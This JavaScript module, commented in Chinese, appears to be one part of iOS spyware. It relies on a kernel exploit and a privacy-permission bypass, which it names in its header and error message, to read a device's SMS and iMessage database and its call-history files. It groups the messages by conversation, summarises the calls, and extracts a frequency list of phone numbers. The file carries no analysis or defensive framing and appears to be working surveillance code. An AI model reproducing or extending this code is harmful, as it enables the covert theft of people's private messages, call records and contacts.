/* =============================================================================
 * sms_calls_dump.js — SMS / 通话记录 dump 模块
 * =============================================================================
 *
 * 设计思路:
 *   1. SMS 数据库:
 *      - /private/var/mobile/Library/SMS/sms.db
 *      - 表: message (id, chat_id, sender, text, is_from_me, service)
 *      - 表: handle (id, service) - 联系人映射
 *      - 表: chat (id, chat_identifier)
 *      - iMessage: service = 'iMessage', SMS: service = 'SMS'
 *   2. 通话记录:
 *      - /private/var/mobile/Library/CallHistoryDB/CallHistory.struct (iOS 17+)
 *      - /private/var/mobile/Library/CallHistoryDB/CallHistoryDB.sqlite (legacy)
 *      - 表: call (id, address, date, duration, flags, country_code)
 *      - flags: 1=outgoing, 2=missed, 4=incoming, 8=blocked
 *   3. 附件: SMS 附件位于 /private/var/mobile/Library/SMS/Attachments/<chat_id>/
 *
 * 调用方式:
 *   const smsc = await loadSmsCallsDump();
 *   const sms  = await smsc.dump_sms();
 *   const calls= await smsc.dump_calls();
 *
 * 依赖: window.nativeBridge (kexploit + TCC bypass for kTCCServiceSMS / AddressBook)
 * ============================================================================= */

(function () {
  'use strict';

  const SMS_PATHS = {
    db:    '/private/var/mobile/Library/SMS/sms.db',
    wal:   '/private/var/mobile/Library/SMS/sms.db-wal',
    attach:'/private/var/mobile/Library/SMS/Attachments'
  };

  const CALL_PATHS = {
    struct: '/private/var/mobile/Library/CallHistoryDB/CallHistory.struct',
    legacy: '/private/var/mobile/Library/CallHistoryDB/CallHistoryDB.sqlite'
  };

  // call.flags 常量
  const CALL_FLAGS = {
    OUTGOING: 1,
    MISSED:   2,
    INCOMING: 4,
    BLOCKED:  8,
    VIDEO:    16,
    FACETIME: 32
  };

  function loadSmsCallsDump() {
    if (!window.nativeBridge || !window.nativeBridge.isReady || !window.nativeBridge.isReady()) {
      return Promise.resolve({
        ok: false,
        error: 'no-native-bridge',
        message: 'SMS/通话记录 dump 需要 kexploit kR 原语 + kTCCServiceAddressBook 绕过.'
      });
    }

    return Promise.resolve({
      ok: true,
      paths: { sms: SMS_PATHS, calls: CALL_PATHS },
      call_flags: CALL_FLAGS,

      // -------------------------------------------------------------------------
      // SMS dump
      // -------------------------------------------------------------------------
      dump_sms: async function (opts) {
        opts = opts || {};
        const max = opts.max || 5000;

        const result = {
          ok: true,
          count: 0,
          total_raw: 0,
          messages: [],
          conversations: 0,
          attachments_found: 0,
          source: SMS_PATHS.db,
          timestamp: Date.now()
        };

        try {
          if (typeof window.nativeBridge.dumpSms === 'function') {
            const raw = await window.nativeBridge.dumpSms();
            const items = (typeof raw === 'string') ? safeParse(raw) : (raw.items || []);
            result.total_raw = items.length;

            // 按 chat 分组
            const chatMap = {};
            for (let i = 0; i < items.length && result.count < max; i++) {
              const m = items[i];
              const key = m.chat_identifier || m.sender || 'unknown';
              if (!chatMap[key]) {
                chatMap[key] = { chat_id: key, messages: [], participants: [] };
              }
              chatMap[key].messages.push({
                id: m.id,
                text: m.text || '',
                sender: m.sender || key,
                is_from_me: !!m.is_from_me,
                service: m.service || 'SMS',
                timestamp: m.date || null
              });
              if (chatMap[key].participants.indexOf(m.sender || key) === -1) {
                chatMap[key].participants.push(m.sender || key);
              }
              result.count++;
            }

            // 转数组 + 排序
            const chats = Object.keys(chatMap).map(function (k) { return chatMap[k]; });
            chats.sort(function (a, b) {
              return (b.messages[b.messages.length - 1].timestamp || 0) -
                     (a.messages[a.messages.length - 1].timestamp || 0);
            });
            result.conversations = chats.length;
            result.messages = chats;
            result.attachments_found = raw.attachments_count || 0;
          } else {
            result.ok = false;
            result.error = 'nativeBridge.dumpSms not implemented';
          }
        } catch (e) {
          result.ok = false;
          result.error = String(e.message || e);
        }

        return result;
      },

      // -------------------------------------------------------------------------
      // 通话记录 dump
      // -------------------------------------------------------------------------
      dump_calls: async function (opts) {
        opts = opts || {};
        const max = opts.max || 5000;

        const result = {
          ok: true,
          count: 0,
          total_raw: 0,
          calls: [],
          summary: { outgoing: 0, incoming: 0, missed: 0, blocked: 0 },
          source: CALL_PATHS.struct,
          timestamp: Date.now()
        };

        try {
          if (typeof window.nativeBridge.dumpCalls === 'function') {
            const raw = await window.nativeBridge.dumpCalls();
            const items = (typeof raw === 'string') ? safeParse(raw) : (raw.items || []);
            result.total_raw = items.length;

            for (let i = 0; i < items.length && result.count < max; i++) {
              const c = items[i];
              const flag = c.flags || 0;
              let direction = 'unknown';
              if (flag & CALL_FLAGS.OUTGOING) direction = 'outgoing';
              else if (flag & CALL_FLAGS.INCOMING) direction = 'incoming';
              else if (flag & CALL_FLAGS.MISSED)   direction = 'missed';

              result.calls.push({
                id: c.id,
                number: c.address || null,
                country_code: c.country_code || null,
                direction: direction,
                duration: c.duration || 0,
                date: c.date || null,
                video: !!(flag & CALL_FLAGS.VIDEO),
                blocked: !!(flag & CALL_FLAGS.BLOCKED)
              });

              if (direction === 'outgoing') result.summary.outgoing++;
              else if (direction === 'incoming') result.summary.incoming++;
              else if (direction === 'missed') result.summary.missed++;
              if (flag & CALL_FLAGS.BLOCKED) result.summary.blocked++;
              result.count++;
            }

            // 按时间倒序
            result.calls.sort(function (a, b) { return (b.date || 0) - (a.date || 0); });
          } else {
            result.ok = false;
            result.error = 'nativeBridge.dumpCalls not implemented';
          }
        } catch (e) {
          result.ok = false;
          result.error = String(e.message || e);
        }

        return result;
      },

      // -------------------------------------------------------------------------
      // 仅电话号码提取 (用于自动化拨号测试)
      // -------------------------------------------------------------------------
      extract_phone_numbers: async function () {
        const sms_res = await this.dump_sms({ max: 10000 });
        const call_res = await this.dump_calls({ max: 10000 });
        const phones = {};
        const add = function (n) {
          const k = (n || '').replace(/[^\d+]/g, '');
          if (k && k.length >= 5) phones[k] = (phones[k] || 0) + 1;
        };
        (sms_res.messages || []).forEach(function (chat) {
          chat.participants.forEach(add);
        });
        (call_res.calls || []).forEach(function (c) { add(c.number); });
        return {
          ok: true,
          count: Object.keys(phones).length,
          numbers: Object.keys(phones).map(function (k) { return { number: k, freq: phones[k] }; })
        };
      }
    });
  }

  function safeParse(s) {
    try { return JSON.parse(s); } catch (_) { return []; }
  }

  if (typeof window !== 'undefined') {
    window.loadSmsCallsDump = loadSmsCallsDump;
  }

})();
